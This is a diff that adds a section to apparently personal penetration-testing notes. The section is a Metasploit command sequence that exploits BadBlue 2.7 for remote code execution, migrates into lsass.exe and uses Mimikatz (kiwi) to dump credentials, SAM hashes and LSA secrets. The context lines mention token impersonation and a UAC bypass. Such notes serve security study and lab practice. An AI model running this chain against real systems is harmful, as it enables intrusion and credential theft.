@@ -298,6 +298,23 @@ impersonate_token blb\\Administrator
 getuid
 ```
 
+### Privilege Escalation via BadBlue 2.7 (Passthru RCE → LSASS Migration → Mimikatz Dump)
+
+1. On the attacker machine:
+
+   ```bash
+   searchsploit badblue 2.7
+   msfconsole -q
+   use exploit/windows/http/badblue_passthru
+   set RHOSTS [host]
+   exploit
+   migrate -N lsass.exe
+   load kiwi
+   creds_all
+   lsa_dump_sam
+   lsa_dump_secrets
+   ```
+   
 ### Privilege Escalation via Akagi64.exe (UAC Bypass) with Reverse Shell
 
 ```bash
